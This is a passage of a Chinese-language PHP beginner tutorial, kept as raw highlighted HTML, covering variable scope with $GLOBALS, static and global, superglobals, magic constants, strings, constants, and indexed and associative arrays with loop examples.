class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//结果是不是显示出来了？</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>1.通过$GLOBLAS来读取外部变量</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$one</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$two</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>   <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$two</span> <span class="token operator">+</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//你会发现结果变成了110</span><span class="token keyword">echo</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上例中：我们将函数体外的变量通过$GLOBALS拿到了函数体使用。所以，打破了函数外的变量不能在函数体内使用的限定。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>static 作用域：</strong></font>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">static</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span>     <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>2.通过$GLOBLAS，在函数内修改外部变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$hongniu</span> <span class="token operator">=</span> <span class="token string">'我是一个兵，来自老百姓'</span><span class="token punctuation">;</span><span class="token keyword">function</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'执行了函数test哟&lt;br />'</span><span class="token punctuation">;</span>   //调用test<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，将通过<span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'hongniu'</span><span class="token punctuation">]</span>,把<span class="token variable">$hongniu</span>的值改变掉   <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'hongniu'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'帮助别人很快乐'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//发现是不是输出的值变了呀？<span class="token keyword">echo</span> <span class="token variable">$hongniu</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过上例：我们发现通过$GLOBALS[‘hongniu’],把$hongniu的值改变掉，所以在最后输出$hongniu的时候，值发生了变化。</p></blockquote><p>&emsp;<br>3.通过$GLOBLAS，在函数内创建全局变量</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'que'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'提神喝茶更好哟'</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token string">'你调了一下函数hello&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$que</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上例中，我们发现$que是不存在的，可以调用函数hello()后，在函数外部可以执行echo $que了，能够看到结果：提神喝茶更好。我们明白了，函数内声明的变量，通过$GLOBALS声明一个变量，也能够显示出来。</p></blockquote><p>&emsp;<br>下面的知识是【了解】级别，我们越来越少的使用这种方式来声明全局变量了。在函数内使用global关键词后面跟一个或多个变量，就把变量变为了全局变量，格式如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">global</span> <span class="token variable">$a</span> <span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//结果是不是显示出来了？</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</font></p><p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp" target="_blank" rel="noopener">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p><p><a href="http://www.php.cn/code/159.html" target="_blank" rel="noopener">使用方法参见</a></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">常量符号</th><th>意义</th></tr></thead><tbody><tr><td align="center">__LINE__</td><td>文件中的当前行号</td></tr><tr><td align="center">__FILE__</td><td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td></tr><tr><td align="center">__DIR__</td><td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td></tr><tr><td align="center">__FUNCTION__</td><td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td></tr><tr><td align="center">__CLASS__</td><td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td></tr><tr><td align="center">__TRAIT__</td><td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td></tr><tr><td align="center">__METHOD__</td><td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-3-PHP-数据类型"><font color="#3CB371" face="Comic sans MS">1.3 PHP 数据类型</font><a href="post/PHP-1#1-3-PHP-数据类型"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP的数据类型包括以下几种：</strong></font><br><strong>Integer（整型）、String（字符串）、Float（浮点型）、Boolean（布尔型）、Array（数组）、Object（对象）、NULL（空值）</strong></font></p><p><font color="red"><strong>2. 查看变量数据类型：</strong></font><br><font color="#00B2EE"><strong>1. gettype(传入一个变量)</strong></font> 能够获得变量的类型<br><font color="#00B2EE"><strong>2. var_dump(传入一个变量)</strong></font>  输出变类型和值 （最常用）<br>var_dump()是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></p><p>&emsp;<br>&emsp;</p><h4 id="1-4-PHP-字符串"><font color="#3CB371" face="Comic sans MS">1.4 PHP 字符串</font><a href="post/PHP-1#1-4-PHP-字符串"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 字符串型可以用三种方法定义：</strong></font><strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc结构</strong>形式。</font></p><p><font color="red"><strong>2.单、双引号嵌套使用时注意事项：</strong></font><br>1.若单引号嵌套单引号或者双引号嵌套双号时：里层(被嵌套)的引号要用“<font color="#FF7F00">&lt;/font&gt;”转义字符转义；<br>2.单引号嵌套双引号或者双引号嵌套单引号时：不需要用转义字符。</font></p><p><font color="red"><strong>3.当美元符<font color="#FF7F00">$</font>在引号里时的区别：</strong></font><br>1.在双引号里：当双引号里包含变量时，变量会双引号里的内容连在一起；<br>2.在单引号里：变量会被当做字符地输出，即“<font color="#FF7F00"><strong>$</strong></font>”会被输出。<br></p><div class="article-img"><p><img src="https://i.loli.net/2019/02/13/5c6438a104ab9.png" alt="1" data-zoomable></p></div><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. Heredoc结构(&lt;&lt;&lt;)：</strong></font><br>2).然后在&lt;&lt;&lt;后面写上字符（建议英文大写字符）。如下例中的：ABC<br>3).然后换行写上任意想写的字符<br>4).写完后，顶行。在行最开始处，再写上&lt;&lt;&lt;后面的字符和分号。如下例中的：ABC;<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$dingjie</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;&lt;</span>ABC     //“<span class="token operator">=</span>”和“<span class="token operator">&lt;&lt;&lt;</span>”和“ABC”这三个标志符号这里是字符串的内容。ABC<span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. PHP strlen()  函数：</strong></font><br>有时知道字符串值的长度是很有用的。<br><font color="#00B2EE"><strong>strlen()</strong></font> 函数返回字符串的长度（字符数）。<br><strong>注意：</strong>在UTF-8下 strlen  把<font color="#00B2EE"><strong>中文字符算成 3 个字节，英文，空格，符号占 1 个字节。</strong></font><br>&emsp;<br><font color="red"><strong>6. PHP strpos() 函数：</strong></font><br><font color="#00B2EE"><strong>strpos()</strong></font>函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>实例:下面的实例在字符串 “Hello world!” 中查找文本 “world”：<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token keyword">echo</span> strpos<span class="token punctuation">(</span><span class="token string">"Hello world!"</span>,<span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>运行结果：6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p><font color="red"><strong>提示：</strong>在上面的实例中，字符串 “world” 的位置是 6。之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</font></p></blockquote></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-5-PHP-常量"><font color="#3CB371" face="Comic sans MS">1.5 PHP 常量</font><a href="post/PHP-1#1-5-PHP-常量"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 自定义常量：</strong></font><br>(1) 常量是单个值的标识符（名称）。在脚本中无法改变该值。<br>(2) 有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。<br>(3) 常量名可以小写，但是通常大写。<br>(4) 常量是全局的，常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</font></p><p><font color="red">定义方法：</font><br>如需设置常量，请使用 define() 函数 - 它使用三个参数：</p><ol><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>可选的第三个参数规定常量名是否对大小写敏感。默认是 false。</li></ol><p><font color="red"><strong>注意关于define和const定义的区别：</strong></font><br>可以用 define() 函数来定义常量。在 PHP 5.3.0 以后，可以使用 <font color="#00B2EE"><strong>const</strong></font>  关键字在类定义的外部定义常量，先前版本const 关键字只能在类（class）中使用。一个常量一旦被定义，就不能再改变或者取消定义。<br>常量只能包含标量数据（boolean，integer，float 和 string）。 可以定义 resource 常量，但应尽量避免，因为会造成不可预料的结果。<br></p><pre class="line-numbers language-php"><code class="language-php">define定义方式：<span class="token delimiter">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"PII"</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PI"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PI</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PII</span><span class="token punctuation">;</span><span class="token delimiter">?></span>运行结果：<span class="token number">3.14</span><span class="token number">3.14</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><pre class="line-numbers language-bash"><code class="language-bash">const定义方式：希望一个成员变量不被修改 例如圆周率 3.1415926定义：const 常量名<span class="token operator">=</span>值<span class="token punctuation">;</span> 没有$符访问：类名 ::常量名 或 接口名::常量名<span class="token operator">&lt;</span>?php　　　　　　　　　　　　　　　　　　　　　　defined<span class="token punctuation">(</span><span class="token string">'TEXT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>检查一个名称的常量是否存在 class A<span class="token punctuation">{</span> const TAX_RATE<span class="token operator">=</span>0.08<span class="token punctuation">;</span> public <span class="token keyword">function</span> payTax<span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token variable">$var*A</span>::TAX_RATE<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>new A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span>-<span class="token operator">></span>payTax<span class="token punctuation">(</span>200<span class="token punctuation">)</span>:?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>用法一：</strong></font>const用于类成员变量，一经定义不可修改，define用于全局常量，不可用于类成员变量的定义，const可在类中使用，define不能。<br><font color="#00B2EE"><strong>用法二：</strong></font>const定义的常量大小写敏感，而define可通过第三个参数(为TRUE表示大小写不敏感)来指定大小写是否敏感。在运行时定义一个常量。define(‘TXE’,100,TRUE);<br><font color="#00B2EE"><strong>用法三：</strong></font>const不能在条件语句中定义常量，而define函数可以。if($a&gt;10){define(‘LE’,’hello’);<br></font></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 判定常量是否被定义：</strong></font><br>如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？<br><font color="#00B2EE"><strong>defined()</strong></font>函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<br><font color="red">bool defined(string constants_name)</font><br>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php define<span class="token punctuation">(</span><span class="token string">"PI1"</span>,3.14<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"PI1"</span><span class="token punctuation">;</span><span class="token variable">$is1</span> <span class="token operator">=</span> defined<span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is2</span> <span class="token operator">=</span> defined<span class="token punctuation">(</span><span class="token string">"PI2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span><span class="token variable">$is1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span><span class="token variable">$is2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP 全局变量 - 超全局变量：</strong></font><br>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global<br>$变量名; 就可以访问它们。</font></p><p><font color="#00B2EE"><strong>PHP 超级全局变量列表：</strong></font> &emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_superglobals.asp" target="_blank" rel="noopener">PHP 全局变量 - 超全局变量</a>]</font><br><strong>$GLOBALS<br>$_SERVER<br>$_REQUEST<br>$_POST<br>$_GET<br>$_FILES<br>$_ENV<br>$_COOKIE<br>$_SESSION</strong><br></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. PHP 系统变量（魔术常量）：</strong></font><br>PHP 向它运行的任何脚本提供了大量的预定义常量。<br>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。<br><font color="#00B2EE"><strong>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</strong></font><br></font> </p><p><a href="http://www.php.cn/code/159.html" target="_blank" rel="noopener">使用方法参见</a></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">常量符号</th><th>意义</th></tr></thead><tbody><tr><td align="center">__LINE__</td><td>文件中的当前行号</td></tr><tr><td align="center">__FILE__</td><td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP<br> 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路<br>径），而在此之前的版本有时会包含一个相对路径。</td></tr><tr><td align="center">__DIR__</td><td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 <br>dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0<br>中新增）</td></tr><tr><td align="center">__FUNCTION__</td><td>函数名称（PHP 4.3.0 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小<br>写）。在 PHP 4 中该值总是小写字母的。</td></tr><tr><td align="center">__CLASS__</td><td>类的名称（PHP 4.3.0 新加）。自 PHP 5起本常量返回该类被定义时的名字（区分大小<br>写）</td></tr><tr><td align="center">__TRAIT__</td><td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP实现了代码复用的一个方法，<br>称为 traits。</td></tr><tr><td align="center">__METHOD__</td><td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-6-PHP数组：索引数组、关联数组"><font color="#3CB371" face="Comic sans MS">1.6 PHP数组：索引数组、关联数组</font><a href="post/PHP-1#1-6-PHP数组：索引数组、关联数组"></a></h4><p><font face="Comic sans MS">数组可以存入多个不同类型的数据，是一个复合数据类型。<br>我们可以使用<font color="red"><strong>array()</strong></font> 来初始化数组，每个数组元素之间使用逗号分隔  ,在PHP5.4版本之后，数组的初始化更为简洁，用中括号<font color="red"><strong>[ ]</strong></font> 来初始化。<br>数组的格式：$shuzu=array(key=&gt;value)<br>key：键值  &emsp; value：键值对应值</font></p><p><font color="red"><strong>1. 索引数组：键值为整形（int）</strong></font><br><strong>我们来总结规律：</strong><br><font color="#00B2EE"><strong>1.</strong></font>索引数组若不强制声明他的下标，他的下标是从0开始的。（我们的第一个数组的值：只有不断努力才能博得未来。这个值的下标为0）。<br><font color="#00B2EE"><strong>2.</strong></font>如果我指定过下标他的下标就为我指定的值。如下标为5,10和下标为19的，都是我指定过的值。<br><font color="#00B2EE"><strong>3.</strong></font>若某个值（如php.cn），强制指定了下标（下标为10）。在它后面加上的值（PHP学院），不指定下标的话。他们的下标增长规律为最大值+1。<br> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php header<span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //设置编码 <span class="token variable">$array</span><span class="token operator">=</span>array<span class="token punctuation">(</span>100,1.34,true,<span class="token string">"PHP中文网"</span>,<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span> var_dump<span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;pre/>'</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 关联数组：键值中只要有一个为字符串（String）类型即称为关联数组）</strong></font><br>那我们来声明一下关联数组。跟索引数组的声明方式完成一样。不过不同的是，必须要指定字符串的下标和必须要使用键值对应符。<br>我们通过实验知道：<br><font color="#00B2EE"><strong>1.</strong></font>声明关联数组是 键名 =&gt; 值。<br><font color="#00B2EE"><strong>2.</strong></font>在关联数组可以有索引数组的元素。<br></font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$arr</span><span class="token operator">=</span><span class="token punctuation">[</span>            //用<span class="token punctuation">[</span> <span class="token punctuation">]</span>创建数组     <span class="token string">'name'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Tom'</span>,     <span class="token string">'age'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'18'</span>,     <span class="token string">'gender'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'male'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span> var_dump<span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">echo</span><span class="token string">"&lt;/pre>"</span> ?<span class="token operator">></span>运行结果：array<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"Tom"</span>  <span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token string">"18"</span>  <span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>4<span class="token punctuation">)</span> <span class="token string">"male"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p><font color="red"><strong>注：</strong></font>上例中<font color="red"><strong>echo pre</strong></font>这个标签的主要目的是为原样输出，格式展示的更好看，更清晰。</p></blockquote></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 索引数组和关联数组遍历分别用for和foreach</strong></font><br><font color="#00B2EE"><strong>1. 索引数组：使用for遍历</strong></font><br></font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$arr</span><span class="token operator">=</span>Array<span class="token punctuation">(</span><span class="token string">'tom'</span>,<span class="token string">'andy'</span>,<span class="token string">'jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$arrlength</span><span class="token operator">=</span>count<span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> for<span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">&lt;</span><span class="token variable">$arrlength</span><span class="token punctuation">;</span><span class="token variable">$x</span>++<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span>  <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><br><font color="#00B2EE"><strong>2. 关联数组：使用foreach遍历</strong></font><br>foreach的基本语法：<br>有一个布尔型循环是专门用来循环数组的。这个循环的基本语法就是foreach基本语法</font></p><p><font color="#FF7F00">foreach( 要循环的数组变量 as [键变量 =&gt;] 值变量)<br>{<br>    //循环的内容<br>}<br></font><br>这是一个固定用法，将要循环的数组放进去。<br>as 是一个固定的关键字；<br>后面的键变量是可选的，随意定义一个变量，每次循环的时候，foreach这个语法会把键取出来赋值到键变量里面；<br>后面的值变量是必填的。每次循环的时候，会把值放到值变量里面。<br>我们下面用代码来举例子，加强对这个语法的理解。<br> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$arr</span><span class="token operator">=</span><span class="token punctuation">[</span>     <span class="token string">'name'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Tom'</span>,     <span class="token string">'age'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'18'</span>,     <span class="token string">'gender'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'male'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> foreach<span class="token punctuation">(</span><span class="token variable">$arr</span> as <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token keyword">.</span><span class="token string">": "</span><span class="token keyword">.</span><span class="token variable">$value</span><span class="token keyword">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：name: Tomage: 18gender: male<span aria-hidden="true" 